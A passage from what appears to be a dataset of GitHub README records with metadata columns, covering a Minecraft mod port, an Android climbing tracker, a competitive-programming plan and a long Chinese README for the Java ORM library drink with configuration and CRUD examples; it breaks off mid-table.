[Ghidra](https://github.com/NationalSecurityAgency/ghidra) for researching the output. 
",3,0,1,0.0,"['tennessinec', 'obtain', 'binary', 'compile', 'http', 'building', 'what', 'i', 'use', 'development']","['tennessinec', 'obtain', 'binary', 'compile', 'http']"
We-Cant-Coding/TACZ-Fabric,1.20.1,"# TACZ-Fabric
Ported Timeless and Classics Zero Forge 1.20.1 to Fabric 1.20.1.

### Known Issue
- [ ] There is a bug where animations don't work properly when certain mods are loaded.<br>
",5,3,1,4.0,"['know', 'issue']","['know', 'issue']"
Dan9704/Olympic-Climber-Tracker-Application,main,"# Olympic Climber Tracker Application


**Olympic Climber Tracker Application** is a mobile app designed to track and enhance the performance of climbers. Whether you’re training for the Olympics or just climbing for fun, this app provides real-time scoring, personalized feedback, and a user-friendly interface that helps athletes and coaches track their progress effortlessly.

<p align=""center"">
  <h3>Sample results on Pixel 8 Pro API 35<h3>
  <img src=""demo/1.gif"" width=""200"">
  <img src=""demo/2.gif"" width=""200"">
  <img src=""demo/3.gif"" width=""200"">
  <img src=""demo/4.gif"" width=""200""> <br />
  <h3>Sample results on Pixel Fold API 35</h3>
  <table>
    <tr>
      <td><img src=""demo/5.gif"" width=""400""></td>
      <td><img src=""demo/6.gif"" width=""400""></td>
    </tr>
  </table>
  <h3>Sample results on Different Language</h3>
  <table>
    <tr>
      <td><img src=""demo/7.gif"" width=""200""></td>
      <td><img src=""demo/8.gif"" width=""200""></td>
      <td><img src=""demo/9.gif"" width=""200""></td>
    </tr>
  </table>
</p>

## Features

- **Real-Time Scoring**: Automatically updates the climber's score based on their performance.
- **Personalized Feedback**: Displays congratulatory messages, time, and score details as the climber reaches new heights.
- **Multilingual Support**: Currently supports English and Vietnamese.
- **Background Music and Sound Effects**: Plays thematic soundtracks and sound effects to enhance the climbing experience.
- **Animation**: Dynamic animations when climbers achieve their goals.
- **Tablet and Phone Support**: Optimized for both tablet and phone devices, ensuring consistent performance across all screen sizes.

## Getting Started

### Prerequisites

- **Android Studio**: Ensure you have Android Studio installed on your computer.
- **Android SDK**: Make sure you have the latest Android SDK installed.

### Installation

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/your-username/OlympicClimberTracker.git
   ```
2. **Open the Project**: Open the project in Android Studio.
3. **Build the Project**: Let Android Studio sync and build the project automatically.
4. **Run the App**: Connect your device or start an emulator, then click the ""Run"" button.

### Usage
- **Start a Climb**: Enter the athlete's name and press the ""Climb"" button to begin tracking their progress.
- **Track Scores**: Watch as the app updates the score in real-time.
- **Reset**: Hit the ""Reset"" button to clear all data and start a new session.
- **Multilingual**: Switch your device's language to see the app in your preferred language.

### Contributing
Contributions are welcome! If you have any ideas or improvements, feel free to submit a pull request or open an issue.

#### Step to Contribute
1. **Fork the Repository.**
2. **Create a New Branch**:
   ```bash
   git checkout -b feature-your-feature-name
   ```
3. **Commit Your Changes**:
   ```bash
   git commit -m 'Add some feature'
   ```
4. **Push to the Branch**:
   ```bash
   git push origin feature-your-feature-name
   ```
5. **Create a Pull Request.**

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Contact

For any questions or suggestions, feel free to reach out:

- **Email**: tungduong9704@gmail.com
- **GitHub**: [GitHub Profile](https://github.com/Dan9704)


",0,0,1,0.0,"['olympic', 'climber', 'tracker', 'application', 'feature', 'get', 'start', 'prerequisite', 'installation', 'usage', 'contribute', 'step', 'contribute', 'license', 'contact']","['contribute', 'olympic', 'climber', 'tracker', 'application']"
ahmedhussein107/Pupils-Plan-W25,main,"# 📚 Pupils Plan W25

Welcome to the **Pupils-Plan-W25** repository! This plan is designed for beginners who are just starting their journey into competitive programming. Over the course of several weeks, you will be introduced to essential programming concepts, data structures, algorithms, and problem-solving techniques.

## 🌐 Codeforces Group

Join our problem-solving community on [Codeforces](https://codeforces.com/group/FcraNkfhvg) to participate in contests and practice sessions. You’ll find problem sets for each week, submit your solutions, and track your progress.

## 📅 Weekly Schedule

### Week 1: Programming Fundamentals (14/9)
- **Topics**: Introduction to Problem Solving
- [Problem Set](https://codeforces.com/group/FcraNkfhvg/contest/550146) | [Solutions](https://www.youtube.com/playlist?list=PLc02D4EoVYQCIhFOfvVcTXV8X826PTMOw)
- [Additional Problems](https://codeforces.com/group/FcraNkfhvg/contest/550147) | [Solutions](https://www.youtube.com/playlist?list=PLc02D4EoVYQCIhFOfvVcTXV8X826PTMOw)

### Week 2: Linear and Non-Linear DS (21/9)
- **Topics**: Linear and Noo-Linear Data Structures
- [Problem Set](https://codeforces.com/group/FcraNkfhvg/contest/551952) | [Solutions]()

### Week 3: Bit Manipulation / Bitmasks (28/9)
- **Topics**: Bit Manipulation
- [Problem Set](https://codeforces.com/group/FcraNkfhvg/contest/554120) | [Solutions](https://www.youtube.com/playlist?list=PLc02D4EoVYQB4_yfNf8xikTLdOfo-JYkK)

<!-- Uncomment the following sections as the weeks progress -->

<!--

### Week 4: Constructive / Greedy / Adhoc (5/10)
- **Topics**: Greedy Algorithms and Adhoc Problem Solving
- Problem Set | Solutions

### Week 5: Prefix Sum / Frequency Array / Partial Sum (12/10)
- **Topics**: Max Subarray Sum, Prefix Operations
- Problem Set | Solutions
-->

<!--
## 📂 Structure

Each week's folder contains:
- A **Problem Set**: A collection of curated problems to help solidify the week’s concepts.
- **Solutions**: Detailed solutions for the problems covered in the sessions.
- **Extra Challenges**: An additional set of problems that may require creative approaches or tricks.
-->

## 🤝 Contributing

Feel free to submit pull requests for new solutions, optimizations, or alternate approaches. Collaboration and learning from each other are highly encouraged!

## 🌱 Goal

The goal of this plan is to introduce beginners to core competitive programming concepts, provide a solid foundation in problem-solving, and prepare students for more advanced topics.

Happy learning and solving! 🎯
",0,0,1,1.0,"['pupil', 'plan', 'codeforces', 'group', 'weekly', 'schedule', 'week', 'programming', 'fundamental', 'week', 'linear', 'd', 'week', 'bit', 'manipulation', 'bitmasks', 'week', 'constructive', 'greedy', 'adhoc', 'week', 'prefix', 'sum', 'frequency', 'array', 'partial', 'sum', 'structure', 'contribute', 'goal']","['week', 'sum', 'pupil', 'plan', 'codeforces']"
kiryu1223/drink,master,"qq群：257911716

**最新最热版本:**![Maven Central Version](https://img.shields.io/maven-central/v/io.github.kiryu1223/drink-all)

## 如何引入

### 从零开始构建的场合

1. 引入maven并且进行配置

   ```xml
   <dependencies>
           <!--需要引入的依赖-->
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-core</artifactId>
               <version>${project.version}</version>
           </dependency>

           <!--需要用户自己提供一个日志实现-->
           <dependency>
               <groupId>ch.qos.logback</groupId>
               <artifactId>logback-classic</artifactId>
               <version>1.2.12</version>
           </dependency>

           <!--数据库-->
           <dependency>
               <groupId>com.mysql</groupId>
               <artifactId>mysql-connector-j</artifactId>
               <version>9.0.0</version>
           </dependency>

           <!--数据源-->
           <dependency>
               <groupId>com.zaxxer</groupId>
               <artifactId>HikariCP</artifactId>
               <version>4.0.3</version>
           </dependency>
   
            <dependency>
                <groupId>org.projectlombok</groupId>
                <artifactId>lombok</artifactId>
                <version>1.18.34</version>
            </dependency>
   
       </dependencies>

       <build>
           <plugins>
               <plugin>
                   <groupId>org.apache.maven.plugins</groupId>
                   <artifactId>maven-compiler-plugin</artifactId>
                   <version>3.8.1</version>
                   <configuration>
                       <!--开启apt的指令-->
                       <compilerArgs>
                           <arg>-Xplugin:ExpressionTree</arg>
                       </compilerArgs>
                       <annotationProcessorPaths>
                           <!--apt路径配置-->
                           <path>
                               <groupId>io.github.kiryu1223</groupId>
                               <artifactId>drink-core</artifactId>
                               <version>${project.version}</version>
                           </path>
                           <!--你的剩余apt路径配置，假设你的项目中还依赖了lombok等apt的话-->
                           <path>
                               <groupId>org.projectlombok</groupId>
                               <artifactId>lombok</artifactId>
                               <version>1.18.34</version>
                           </path>
                       </annotationProcessorPaths>
                   </configuration>
               </plugin>
           </plugins>
       </build>
   ```
2. 配置完成后进入main

   ```java
   package io.github.kiryu1223;

   import com.zaxxer.hikari.HikariDataSource;
   import io.github.kiryu1223.drink.Drink;
   import io.github.kiryu1223.drink.api.client.DrinkClient;
   import io.github.kiryu1223.drink.transaction.DefaultTransactionManager;
   import io.github.kiryu1223.drink.transaction.TransactionManager;
   import io.github.kiryu1223.drink.core.dataSource.DataSourceManager;
   import io.github.kiryu1223.drink.core.dataSource.DefaultDataSourceManager;
   import io.github.kiryu1223.drink.core.session.DefaultSqlSessionFactory;
   import io.github.kiryu1223.drink.core.session.SqlSessionFactory;

   public class Main
   {
       public static void main(String[] args)
       {
           // 配置一个数据源
           HikariDataSource dataSource = new HikariDataSource();
           dataSource.setJdbcUrl(""jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true"");
           dataSource.setUsername(""root"");
           dataSource.setPassword(""root"");
           dataSource.setDriverClassName(""com.mysql.cj.jdbc.Driver"");

           // 获取一个DrinkClient对象，所有的CRUD都通过他完成
           DataSourceManager dataSourceManager = new DefaultDataSourceManager(dataSource);
           TransactionManager transactionManager = new DefaultTransactionManager(dataSourceManager);
           SqlSessionFactory sqlSessionFactory = new DefaultSqlSessionFactory(dataSourceManager, transactionManager);

           Option option = new Option();
           option.setPrintSql(true);

           DrinkClient client = Drink.bootStrap()
                   .setDbType(DbType.MySQL)
                   .setOption(option)
                   .setDataSourceManager(dataSourceManager)
                   .setTransactionManager(transactionManager)
                   .setSqlSessionFactory(sqlSessionFactory)
                   .build();
       }
   }
   ```

3. 启动！

### 使用SpringBoot

1. 引入starter并且开启apt

   ```xml
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-spring-boot-starter</artifactId>
               <version>${project.version}</version>
           </dependency>
   ```
   ```xml
      <build>
         <plugins>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-compiler-plugin</artifactId>
                 <version>3.8.1</version>
                 <configuration>
                     <compilerArgs>
                         <arg>-Xplugin:ExpressionTree</arg>
                     </compilerArgs>
                     <annotationProcessorPaths>
                         <path>
                             <groupId>io.github.kiryu1223</groupId>
                             <artifactId>drink-core</artifactId>
                             <version>${project.version}</version>
                         </path>
                     </annotationProcessorPaths>
                 </configuration>
             </plugin>
         </plugins>
     </build>
   ```
2. 配置yml
   ```yaml
   spring:
     output:
       ansi:
         enabled: always
     profiles:
       active: dev
     # 最低程度配置下只需要提供一个数据源
     dsName:
       type: com.zaxxer.hikari.HikariDataSource
       url: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
       username: root
       password: root
       driverClassName: com.mysql.cj.jdbc.Driver

   server:
     port: 8080

   # 不配置的情况下默认以database: mysql和print-sql: true模式运行
   #drink:
   #  database: mysql
   #  print-sql: true
   ```

3. 启动！

### 使用Solon

1. 引入插件并且开启apt

   ```xml
           <dependency>
               <groupId>io.github.kiryu1223</groupId>
               <artifactId>drink-solon-plugin</artifactId>
               <version>${project.version}</version>
           </dependency>
   ```
   ```xml
      <build>
         <plugins>
             <plugin>
                 <groupId>org.apache.maven.plugins</groupId>
                 <artifactId>maven-compiler-plugin</artifactId>
                 <version>3.8.1</version>
                 <configuration>
                     <compilerArgs>
                         <arg>-Xplugin:ExpressionTree</arg>
                     </compilerArgs>
                     <annotationProcessorPaths>
                         <path>
                             <groupId>io.github.kiryu1223</groupId>
                             <artifactId>drink-core</artifactId>
                             <version>${project.version}</version>
                         </path>
                     </annotationProcessorPaths>
                 </configuration>
             </plugin>
         </plugins>
     </build>
   ```
2. 配置config和yml

   ```yml
   # 这个名称与config类中的@Inject(""${ds1}"")对应
   ds1:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds2}"")对应
   ds2:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root
   # 这个名称与config类中的@Inject(""${ds3}"")对应
   ds3:
     type: com.zaxxer.hikari.HikariDataSource
     jdbcUrl: jdbc:mysql://127.0.0.1:3306/employees?rewriteBatchedStatements=true
     driverClassName: com.mysql.cj.jdbc.Driver
     username: root
     password: root

   # 这个名称与config类中的@Inject(""${dynamic}"")对应
   # 多数据源
   dynamic:
     type: com.zaxxer.hikari.HikariDataSource
     strict: true #严格模式（指定的源不存时：严格模式会抛异常；非严格模式用默认源）
     default: db_user_1 #指定默认数据源
     db_user_1:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3306/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456
     db_user_2:
       schema: db_user
       jdbcUrl: jdbc:mysql://localhost:3307/db_user?useUnicode=true&characterEncoding=utf8&autoReconnect=true&rewriteBatchedStatements=true
       driverClassName: com.mysql.cj.jdbc.Driver
       username: root
       password: 123456

   drink:
     # 这个名称代表了ioc容器中Client对象bean的别名，通过@Inject(""main"")注入到你想要的地方，下同
     main:
       database: MySQL
       # 这里需要一个config类中定义的的数据源的bean的别名，下同
       dsName: normalDs1
     sub:
       database: SqlServer
       dsName: normalDs2
     readonly:
       database: H2
       dsName: normalDs3
     dynamic:
       database: H2
       dsName: dynamicDs
   ```

   ```java
   package io.github.kiryu1223.app.config;

   import com.zaxxer.hikari.HikariDataSource;
   import org.noear.solon.annotation.Bean;
   import org.noear.solon.annotation.Configuration;
   import org.noear.solon.annotation.Inject;
   import org.noear.solon.data.dynamicds.DynamicDataSource;

   import javax.sql.DataSource;

   @Configuration
   public class MyConfig
   {
       @Bean(""normalDs1"")
       public DataSource dataSource1(@Inject(""${ds1}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs2"")
       public DataSource dataSource2(@Inject(""${ds2}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""normalDs3"")
       public DataSource dataSource3(@Inject(""${ds3}"") HikariDataSource dataSource)
       {
           return dataSource;
       }

       @Bean(""dynamicDs"")
       public DataSource dataSource4(@Inject(""${dynamic}"") DynamicDataSource dataSource)
       {
           return dataSource;
       }
   }
   ```

   注意，在只配了一个client对象的情况下，使用`@inject`注解在service或者你想要的地方注入Client对象时，不需要填入别名（否则会找不到报错）

3. 启动！

## 常用的注解

| 名称       | 参数                    | 说明                                                          |
|----------|-----------------------|-------------------------------------------------------------|
| `Column` | 参数1：数据库列名<br/>参数2：转换器 | Column注解用于类型的字段与数据库字段不一致的场合，或者是类型不一致需要转换的场合（java枚举<->数据库枚举） |
| `Table`  | 参数1：表名                | Table注解用于类名与表名不一致的场合                                        |

## CRUD

所有的增删查改操作都由DrinkClient对象完成（以下简称为client）

以下是主要使用的api

| 方法     | 参数             | 返回     |
|--------|----------------|--------|
| query  | 数据库表对应对象的class | 查询过程对象 |
| insert | 一个或者多个相同的表对应对象 | 新增过程对象 |
| update | 数据库表对应对象的class | 更新过程对象 |
| delete | 数据库表对应对象的class | 删除过程对象 |

### 查询

查询由client对象的query方法发起，query方法接收一个class对象，返回一个查询过程对象，
可以在后续调用`where` `group by` `limit`等方法添加查询条件

以下是常用的查询过程的api

| 方法          | 参数                                            | 返回                        | 说明                                                                                                                                                                            |
|-------------|-----------------------------------------------|---------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
| `leftJoin`  | 参数1：class对象或者LQuery对象<br/> 参数2：连接条件的lambda表达式 | 当前泛型数量+1的查询过程对象（因为连了一张新表） | 左连接                                                                                                                                                                           |
| `rightJoin` | 同leftJoin                                     | 同leftJoin                 | 右连接                                                                                                                                                                           |
| `innerJoin` | 同leftJoin                                     | 同leftJoin                 | 内连接                                                                                                                                                                           |
| `where`     | where条件的lambda表达式                             | this                      | where过滤条件，多个where默认使用and拼接                                                                                                                                                    |
| `orWhere`   | 同where                                        | this                      | 同where，区别是多个where使用or拼接                                                                                                                                                       |
| `groupBy`   | 返回单个元素或者包含多个元素的Grouper对象的lambda               | 组查询过程对象                   | 单个元素的group by时，可以直接类似于<br/>`a -> a.getId()`<br/>这样的lambda,多个元素时需要使用 <br/>a -> new Grouper()<br/>{ <br/>int id=a.getId();<br/>String name=a.getName();<br/>...<br/>} 这样的lambda |
| `having`    | having条件的lambda表达式                            | this                      | having过滤条件，多个having使用and连接                                                                                                                                                    |
| `orderBy`   | 参数1：需要排序的一个字段<br/>参数2：是否反向排序                  | this                      | 默认正序排序，有多个排序字段的需求时需要调用次orderBy方法                                                                                                                                              |
| `limit`     | rows或者offset和rows                             | this                      |                                                                                                                                                                               |
| `distinct`  | 无参或bool                                       | this                      | 无参调用时将distinct设置为true                                                                                                                                                         |
| `select `   | 无参select()或select(Vo.class)或select(lambda)    | 新查询过程对象                   | select代表一次查询过程的终结，在select之后调用任意条件api（例如where）都将把上一个查询过程视为中间表然后对中间表进行的查询                                                                                                       |
| `endSelect` | 需要返回的字段与返回类型                                  | 终结查询过程对象                  | 同select,区别是当需要返回单一的元素时（比如说`select(s -> s.getId())`），出于安全考虑强制要求使用endSelect（`endSelect(s -> s.getId())`）而非select                                                                |
| `toList`    |                                               | 查询返回的结果集                  | 多表查询时必须进行一次select之后才能进行返回结果集操作（因为多表情况下不知道到底要返回什么）                                                                                                                             |

假设我们有一个员工表

```java

@Data
@Table(""employees"")
public class Employee
{
    //员工id
    @Column(""emp_no"")
    private int number;
    //生日
    @Column(""birth_date"")
    private LocalDate birthDay;
    @Column(""first_name"")
    private String firstName;
    @Column(""last_name"")
    private String lastName;
    //性别
    @Column(converter = GenderConverter.class)
    private Gender gender;
    //入职日期
    @Column(""hire_date"")
    private LocalDate hireDay;
}
```

根据id获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d1()
    {
        int id = 10001;
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`,t0.`first_name`,t0.`last_name`,t0.`emp_no`,t0.`hire_date`,t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`emp_no` = ?
```

根据firstName和性别获得员工对象

```java
public class DisplayTest extends BaseTest
{
    public void d2()
    {
        List<Employee> list = client.query(Employee.class) // FROM `employees` AS t0
                .where(e -> e.getGender() == Gender.F && e.getFirstName() == ""lady"") // WHERE t0.`gender` = ? AND t0.`first_name` = ?
                // 因为没有select，默认选择了全字段 
                // SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`birth_date`, t0.`first_name`, t0.`last_name`, t0.`emp_no`, t0.`hire_date`, t0.`gender`
FROM `employees` AS t0
WHERE t0.`gender` = ?
  AND t0.`first_name` = ?
```

假设我们还有一张员工薪资历史表

```java

@Data
@Table(""salaries"")
public class Salary
{
    //员工id
    @Column(""emp_no"")
    private int empNumber;
    //薪资
    private int salary;
    //何时开始的
    @Column(""from_date"")
    private LocalDate from;
    //何时为止的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询一个员工的姓名和历史最高薪资和平均薪资

```java
public class DisplayTest extends BaseTest
{
    public void d3()
    {
        int id = 10001;
        List<? extends Result> list = client.query(Employee.class) // FROM `employees` AS t0
                .leftJoin(Salary.class, (e, s) -> e.getNumber() == s.getEmpNumber()) // LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .where((e, s) -> e.getNumber() == id) // WHERE t0.`emp_no` = ?
                // SELECT
                .select((e, s) -> new Result()
                {
                    // CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name` 
                    String name = SqlFunctions.concat(e.getFirstName(), "" "", e.getLastName());
                    // MAX(t1.`salary`)                           AS `maxSalary`,
                    int maxSalary = SqlFunctions.max(s.getSalary());
                    // AVG(t1.`salary`)                           AS `avgSalary`
                    BigDecimal avgSalary = SqlFunctions.avg(s.getSalary());
                })
                .toList();
    }
}
```

对应的sql

```mysql
SELECT CONCAT(t0.`first_name`, ?, t0.`last_name`) AS `name`,
       MAX(t1.`salary`)                           AS `maxSalary`,
       AVG(t1.`salary`)                           AS `avgSalary`
FROM `employees` AS t0
         LEFT JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
WHERE t0.`emp_no` = ?
```

假设我们还有部门表和员工部门中间表

```java

@Table(""departments"")
@Data
public class Department
{
    // 部门编号
    @Column(""dept_no"")
    private String number;
    // 部门名称
    @Column(""dept_name"")
    private String name;
}
```

```java

@Data
@Table(""dept_emp"")
public class DeptEmp
{
    // 员工编号
    @Column(""emp_no"")
    private int empNumber;
    // 部门编号
    @Column(""dept_no"")
    private String deptNumber;
    // 什么时候加入的
    @Column(""from_date"")
    private LocalDate from;
    // 什么时候离开的
    @Column(""to_date"")
    private LocalDate to;
}
```

查询某部门的员工的平均薪水

```java
public class DisplayTest extends BaseTest
{
    public void d4()
    {
        String departmentId = ""d009"";

        List<? extends Result> list = client.query(DeptEmp.class) // FROM `dept_emp` AS t0
                .innerJoin(Salary.class, (de, s) -> de.getEmpNumber() == s.getEmpNumber()) // INNER JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
                .innerJoin(Department.class, (de, s, d) -> de.getDeptNumber() == d.getNumber()) // INNER JOIN `departments` AS t2 ON t0.`dept_no` = t2.`dept_no`
                .where((de, s, d) -> de.getDeptNumber() == departmentId && s.getTo() == LocalDate.of(9999, 1, 1)) // WHERE t0.`dept_no` = ? AND t1.`to_date` = ?
                // GROUP BY 
                .groupBy((de, s, d) -> new Grouper()
                {
                    // t0.`dept_no`, 
                    String id = de.getDeptNumber();
                    // t2.`dept_name`
                    String name = d.getName();
                })
                // SELECT
                .select(g -> new Result()
                {
                    // t0.`dept_no` AS `deptId`
                    String deptId = g.key.id;
                    // t2.`dept_name` AS `deptName`
                    String deptName = g.key.name;
                    // AVG(t1.`salary`) AS `avgSalary`
                    BigDecimal avgSalary = g.avg((de, s, d) -> s.getSalary());
                })
                .toList();
    }
}
```

对应的sql

```mysql
SELECT t0.`dept_no` AS `deptId`, t2.`dept_name` AS `deptName`, AVG(t1.`salary`) AS `avgSalary`
FROM `dept_emp` AS t0
         INNER JOIN `salaries` AS t1 ON t0.`emp_no` = t1.`emp_no`
         INNER JOIN `departments` AS t2 ON t0.`dept_no` = t2.`dept_no`
WHERE t0.`dept_no` = ?
  AND t1.`to_date` = ?
GROUP BY t0.`dept_no`, t2.`dept_name`
```

### 新增

新增由client对象的insert方法发起，insert方法接收一个或多个数据库表对应的对象，
返回一个新增过程对象,可以对这个新增过程对象后续进行insert方法添加更多数据

| 方法          | 参数           | 返回      | 说明             |
|-------------|--------------|---------|----------------|
| insert      | 同类型单个对象或对象集合 | this    | 添加更多需要传入数据库的对象 |
| executeRows |              | 执行成功的数量 | 执行insert       |

> 注意：insert根据数量自动选择批量执行（数量>=2）

Department表新增一个数据

```java
public class DisplayTest extends BaseTest
{
    public void i1()
    {
        Department department = new Department();
        department.setNumber(""101"");
        department.setName(""ddd"");

        client.insert(department).executeRows();
    }
}
```

新增多个数据

```java
public class DisplayTest extends BaseTest
{
    public void i2()
    {
        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> list = Arrays.asList(department1, department2, department3);

        client.insert(list).executeRows();
    }
}
```

新增任意数据

```java
public class DisplayTest extends BaseTest
{
    public void i3()
    {
        Department d = new Department();

        Department department1 = new Department();
        department1.setNumber(""101"");
        department1.setName(""ddd"");
        Department department2 = new Department();
        department2.setNumber(""102"");
        department2.setName(""eee"");
        Department department3 = new Department();
        department3.setNumber(""103"");
        department3.setName(""fff"");

        List<Department> ds = Arrays.asList(department1, department2, department3);

        client.insert(d).insert(ds).executeRows();
    }
}
```

### 更新

更新由client对象的update方法发起，update方法接收一个class对象，返回一个更新过程对象，
可以对这个对象后续进行`set`设置数据和`where`限制更新范围等操作

| 方法                   | 参数               | 返回       | 说明                       |
|----------------------|------------------|----------|--------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin | 新的更新过程对象 | 用于连表更新，操作方式与查询时的join方法一致 |
| set                  | lambda表达式        | this     | 设置更新数据的lambda表达式         |
| where                | 同查询过程对象的where    | this     | 同查询过程对象的where            |

> 警告：进行无where限制下的update时默认会报错，需要手开启无视无where限制

为Department表更新数据

```java
public class UpdateTest extends BaseTest
{
    public void display0()
    {
        long l2 = client.update(Department.class)
                .set(s -> s.setName(""newName""))
                .where(w -> w.getNumber() == ""100"")
                .executeRows();
    }
}
```

对应sql

```mysql
UPDATE `departments` AS t0
SET t0.`dept_name` = ?
WHERE t0.`dept_no` = ?
```

连表更新

```java

@SuppressWarnings(""all"")
public class UpdateTest extends BaseTest
{
    long l = client.update(Department.class)
            .leftJoin(DeptEmp.class, (a, b) -> a.getNumber() == b.getDeptNumber())
            .set((a, b) -> a.setName(b.getDeptNumber()))
            .where((a, b) -> 1 == 1)
            .executeRows();
}
```

对应sql

```mysql
UPDATE `departments` AS t0 LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
SET t0.`dept_name` = t1.`dept_no`
WHERE ? = ?
```

### 删除

删除由client对象的delete方法发起，delete方法接收一个class对象，返回一个删除过程对象，
可以对这个对象后续进行`where`限制更新范围等操作

| 方法                   | 参数                      | 返回       | 说明                                                |
|----------------------|-------------------------|----------|---------------------------------------------------|
| left/right/innerJoin | 同查询过程对象的leftJoin        | 新的删除过程对象 | 用于连表删除，操作方式与查询时的join方法一致                          |
| where                | 同查询过程对象的where           | this     | 同查询过程对象的where                                     |
| selectDelete         | 返回需要删除的目标表的对象的lambda表达式 | this     | join后连表删除时可以使用，用于指定需要删除的表，可以通过多次调用增加目标（无调用默认选择全部） |

> 警告：进行无where限制下的delete时默认会报错，需要手开启无视无where限制

为Department表删除数据

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d1()
    {
        long executeRows = client.delete(Department.class)
                .where(w -> w.getNumber() == ""10009"")
                .executeRows();
    }
}
```

对应sql

```mysql
DELETE
FROM `departments` AS t0
WHERE t0.`dept_no` = ?
```

连表删除

```java
public class DeleteTest extends BaseTest
{
    @Test
    public void d2()
    {
        String sql = client.delete(Department.class)
                .leftJoin(DeptEmp.class, (d, dm) -> d.getNumber() == dm.getDeptNumber())
                .where((d, dm) -> d.getNumber() == ""d009"")
//                .selectDeleteTable((d, dm) -> d)
                .selectDelete((d, dm) -> dm)
                .toSql();
        System.out.println(sql);
    }
}
```

对应sql

```mysql
DELETE t1
FROM `departments` AS t0
         LEFT JOIN `dept_emp` AS t1 ON t0.`dept_no` = t1.`dept_no`
WHERE t0.`dept_no` = ?
```

## 关联查询 INCLUDE

假设我们有一个工资类和一个员工类，员工类配置了对工资类的关联信息，员工与工资是一对多关系（一个员工有多个工资信息）

```java

@Data
@Table(value = ""salaries"")
public class Salary
{
    @Column(value = ""emp_no"", primaryKey = true)
    private int empNumber;
    private int salary;
    @Column(""from_date"")
    private LocalDate from;
    @Column(""to_date"")
    private LocalDate to;
}

@Data
@Table(""employees"")
public class Employee
{
   @Column(value = ""emp_no"",primaryKey = true)
   private int number;
   @Column(""birth_date"")
   private LocalDate birthDay;
   @Column(""first_name"")
   private String firstName;
   @Column(""last_name"")
   private String lastName;
   @Column(converter = GenderConverter.class)
   private Gender gender;
   @Column(""hire_date"")
   private LocalDate hireDay;
   // 一对多，self为自身的number字段，target为Salary的empNumber字段
   @Navigate(value = RelationType.OneToMany, self = ""number"", target = ""empNumber"")
   private List<Salary> salaries;
}
```

现在我们就可以填充指定的员工的工资信息

```java
public class IncludeTest extends BaseTest
{
    @Test
    public void oneManyTest()
    {
        //获取编号为10001的员工并且查询出该员工的所有工资信息
       Employee employee = client.query(Employee.class)
               .where(e -> e.getNumber() == 10001)
               .includes(e -> e.getSalaries())
               .first();

        Assert.assertEquals(17, employee.getSalaries().size());
    }
}
```

我们也可以对这个查询做出限制

```java
public class IncludeTest extends BaseTest
{
   @Test
   public void oneManyCondTest()
   {
      //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
      Employee employee = client.query(Employee.class)
              .where(e -> e.getNumber() == 10001)
              .includes(e -> e.getSalaries(), s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
              .first();

      Assert.assertEquals(16, employee.getSalaries().size());
   }
}
```

也支持更复杂的限制条件，比方说限制关联查询获取的条目数

```java
public class IncludeTest extends BaseTest
{
   @Test
   public void oneManyCond2Test()
   {
      //获取编号为10001的员工并且查询出该员工最后一次调整工资（9999-01-01）以外的历史工资
      //同时只获取前10条
      //并且按工资排序
      Employee employee = client.query(Employee.class)
              .includesByCond(e -> e.getSalaries(), query -> query
                      .orderBy(s -> s.getSalary())
                      .where(s -> s.getTo().isBefore(LocalDate.of(9999, 1, 1)))
                      .limit(10)
              )
              .first();
      
      Assert.assertEquals(10, employee.getSalaries().size());
   }
}
```

## 支持的sql函数

框架内部支持了绝大多数的常用sql函数，具体逻辑可以在SqlFunctions类中查看

`时间相关`

| 函数名            | 参数 | 返回类型                    | 功能                   |
|----------------|----|-------------------------|----------------------|
| now            |    | LocalDateTime           | 获取当前的日期时间            |
| utcNow         |    | LocalDateTime           | 获取当前的utc日期时间         |
